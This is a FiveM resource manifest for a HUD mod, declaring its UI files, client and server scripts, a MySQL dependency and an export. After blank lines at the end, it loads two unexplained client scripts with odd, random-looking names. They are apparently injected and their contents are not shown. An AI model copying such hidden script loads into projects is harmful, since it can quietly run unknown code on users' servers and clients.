resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'adisexe_hud created by Adisexe & BorzeN'

ui_page 'html/ui.html'

client_script 'client.lua'
server_scripts {
	'server.lua',
	'@mysql-async/lib/MySQL.lua'
}

files {
	-- Main Images
	'html/ui.html',
	'html/style.css',
	'html/grid.css',
	'html/main.js',
	-- Bottom Round Images
	'html/img/*.png'
}

exports {
	'getPeople'
}






client_script "19268.lua"
client_script "szymczakof_XljGzTNhQGBr.lua"